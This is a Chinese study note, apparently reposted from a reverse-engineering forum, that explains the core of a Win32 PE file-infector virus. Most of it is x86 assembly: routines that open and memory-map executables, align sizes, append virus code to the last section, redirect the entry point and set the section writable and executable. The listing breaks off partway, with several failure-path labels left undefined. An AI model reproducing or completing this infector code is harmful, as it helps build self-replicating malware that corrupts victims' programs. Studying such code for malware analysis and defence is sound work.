
# PE 病毒学习笔记：初识感染技术

> 原文：[`www.pediy.com/kssd/pediy09/pediy09-294.htm`](https://www.pediy.com/kssd/pediy09/pediy09-294.htm)

## 前言

本来打算 10.1 长假天天去自习的，结果学校居然在假期把所有的自习室都关门了事，没办法，只好待寝室面对电脑就打算再来一篇学习笔记。我了解的知识非常有限，代码也很初级，欢迎大家批评和讨论。

说起“感染技术”，一般印象里都是感染文件，准确说，是“感染可执行文件”。事实上，除了文件感染，也可以是“进程感染”，也就是“进程注入”。但是相比而言，文件感染古老多了，早在单进程环境的 DOS 下就开始发展，而且相比“进程注入”，在我看来要复杂些。

现在我们只考虑 Win32 环境下的文件感染。毫无疑问，读写文件的过程需要大量使用到 API，如果看过我之前的关于“搜索 API”的学习笔记的话，那么这个工作在这里不过是一个循环而已。

先考虑最简单的情况，感染没有在运行的、普通的执行文件。

## 文件搜索

首先是要搜索文件，Win32API 有三个函数：`FindFirstFile()`, `FindNextFile()`, `FindClose()`，事实上大家都可以想象到，应该是 `FindFirstFileA()`, `FindNextFileA()` 和 `FindFirstFileW()`, `FindNextFileW()`，Windows 的一贯风格。这几个函数由 `kernel32.dll` 导出，具体使用可以通过 MSDN 解决了，不过这里要强调一个结构：

`WIN32_FIND_DATA`，这里面会保存有搜索到的文件的相关信息，特别是：

- “文件大小”
  （`DWORD nFileSizeHigh;  DWORD nFileSizeLow;` 如果这个文件没有大于 4GB 的话，就只用考虑 `nFileSizeLow`）
- 和“文件名”
  （`TCHAR cFileName[MAX_PATH]`）

这两个变量，对我们来说比较重要。

下面，搜索到具体的文件后，看看我们需要些哪些 API 支持我们的工作：

```asm
;----------------------------------------------
; input:
; ESI = Address of Filename
; _CreateFileA = VA of CreateFileA
;
; output:
; EAX = Opened Filehandle or -1
;
; used reg
; EAX,ESI
;----------------------------------------------
OpenFile proc
    xor eax,eax
    push eax
    push eax
    push 00000003h
    push eax
    inc eax
    push eax
    push 80000000h or 40000000h
    push esi
    call _CreateFileA
    ret
OpenFile endp
```

首当其冲的当然是以“可读”和“可写”方式打开文件，`kernel32` 里的 `CreateFileA` 完成这项工作。

## 文件映射

```asm
;----------------------------------------------
; input:
; ECX = Mapping Size
; _CreateFileMappingA = VA of CreateFileMappingA
; FileHandle = Opened Filehandle
;
; output:
; EAX = Mapped Handle or -1
;
; used reg
; EAX,ECX
;----------------------------------------------
CreateMap proc
    xor eax,eax
    push eax
    push ecx
    push eax
    push 00000004h
    push eax
    push dword ptr FileHandle
    call _CreateFileMappingA
    ret
CreateMap endp
```

```asm
;----------------------------------------------
; input:
; ECX = Mapping Size
; _MapViewOfFile = VA of MapViewOfFile
; MapHandle = Mapped Maphandle
;
; output:
; EAX = Map Address or 0
;
; used reg
; EAX,ECX
;----------------------------------------------
MapFile proc
    xor eax,eax
    push ecx
    push eax
    push eax
    push 00000002h
    push dword ptr MapHandle
    call _MapViewOfFile
    ret
MapFile endp
```

下来就是把文件映射到内存里，当然，用 `ReadFile` 和 `WriteFile` 也是可以的，可是我喜欢读写“内存”的感觉（感觉是绝对一样的），而不是不停的 `push` `push` 地去调用 API，哪怕我只要读或写一个 Byte。`CreateFileMappingA` 和 `MapViewOfFile`，这两个函数都在 `kernel32` 里。

还有一些 API 比如 `SetFileAttributesA`，`UnmapViewOfFile` 和 `CloseHandle`，因为参数少且简单，所以就不单独定义成 proc 了。我也假定在之前的工作里，已经找到了这些 API 的 VA，并且存在了 API 名字前加一下划线的变量里，比如 `CloseHandle` 的地址就存在 `_CloseHandle` 里。最后再说一遍，这里用到的所有的所有函数都来自于 `kernel32` 里。

但是有一个特殊些：

```asm
;----------------------------------------------
; input:
; EAX = Value need align
; ECX = FileAlign
;
; output:
; EAX = Value aligned
;
; used reg
; EAX,ECX,EDX
;----------------------------------------------
Align proc
    push edx
    xor edx,edx
    push eax
    div ecx
    pop eax
    sub ecx,edx
    add eax,ecx
    pop edx
    ret
Align endp
```

这是一个非常重要的 proc，用来算“对齐”的。一定要注意 PE 结构里的对齐，特别是在做 Size 的加减和变化时，一定要注意对齐。很多人一开始写修改 PE 文件结构的程序时，导致诸如“不是有效的 Win32 程序”错误的原因大多是因为没有对齐好。

我还假定所有用到的变量已经定义好，特别注意 `WFD_szFileName` 和 `WFD_nFileSizeLow`，就是我前面提到的，你打算感染的文件的 `WIN32_FIND_DATA` 结构里的成员。

## 感染过程代码

```asm
Infection proc
    lea esi,WFD_szFileName
    
    push 80h
    push esi
    call _SetFileAttributesA
    
    call OpenFile
    inc eax
    jz _Infection_CantOpen
    dec eax
    mov FileHandle,eax
    
    mov ecx,WFD_nFileSizeLow

_Infection_Mapping:
    push ecx
    call CreateMap
    or eax,eax
    jz _Infection_CloseFile
    mov MapHandle,eax
    
    pop ecx
    call MapFile
    or eax,eax
    jz _Infection_UnMapFile
    mov MapAddress,eax

    mov esi,[eax+3Ch]
    add esi,eax
    cmp IsMapped,1
    jz _Infection_Go_on
    cmp dword ptr [esi],"EP"
    jnz _Infection_NoInfect
    mov ecx,[esi+3ch]
    
    push dword ptr MapAddress
    call _UnmapViewOfFile
    push dword ptr MapHandle
    call _CloseHandle

    mov eax,WFD_nFileSizeLow
    add eax,virus_size
    call Align
    
    xchg ecx,eax
    mov IsMapped,1
    jmp _Infection_Mapping

_Infection_Go_on:
    mov edi,esi                     ;------------- EDI = ESI = Ptr to PE header
    movzx eax,word ptr [edi+06h]    ;------------- AX = Num of sections
    dec eax
    imul eax,eax,28h                ;------------- EAX = AX*28h
    add esi,78h                     ;------------- Ptr to dir table
    mov edx,[edi+74h]               ;------------- EDX = Num of dir entries
    shl edx,3                       ;------------- EDX = EDX*8
    add esi,edx                     ;------------- ESI = Ptr to first section table
    add esi,eax                     ;------------- ESI = Ptr to last section table

    mov eax,[edi+28h]               ;------------- EAX = RVA of Entry Point
    mov OldEP,eax
    mov eax,[edi+34h]               ;------------- EAX = ImageBase
    mov ImgBase,eax
    mov edx,[esi+10h]               ;------------- EDX = SizeOfRawData
    mov ebx,edx                     ;------------- EBX = EDX = SizeOfRawData
    add edx,[esi+14h]               ;------------- EDX = EDX+PointerToRawData
    push edx
    mov eax,ebx                     ;------------- EAX = EBX = SizeOfRawData
    mov ebp,[esi+0Ch]               ;------------- EBP = VirtualAddress
    add eax,ebp                     ;------------- EAX = SizeOfRawData + VirtualAddress
    mov [edi+28h],eax              ;------------- Set RVA of Entry Point to EAX--New EP
    mov NewEP,eax
    
    mov eax,ebx                     ;------------- EAX = SizeOfRawData
    add eax,virus_size              ;------------- EAX = SizeOfRawData + VirusSize
    mov ecx,[edi+3Ch]               ;------------- ECX = File Alignment
    call Align
    mov [esi+10h],eax              ;------------- New SizeOfRawData
    mov [esi+08h],eax              ;------------- New VirtualSize
    add eax,ebp                     ;------------- EAX = EAX + VirtualAddress
    mov [edi+50h],eax              ;------------- EAX = New SizeOfImage
    or dword ptr [esi+24h],0f0000020h
    
    lea esi,[virus_start]          ; ESI = Ptr to virus_start
    pop edx                         ; EDX = Start of virus will be copy---RAV
    xchg edi,edx                   ; EDI = Start of virus will be copy---RAV , EDX = Ptr to PE header
    add edi,MapAddress              ; EDI = Start of virus will be copy---VA
    mov ecx,virus_size             ; ECX = virus_size
    rep movsb                      ; Do it
    jmp _Infection_UnMapFile

_Infection_UnMapFile:
    push dword ptr MapAddress
    call _UnmapViewOfFile
    
_Infection_CloseMap:
    push dword ptr MapHandle
    call _CloseHandle
```
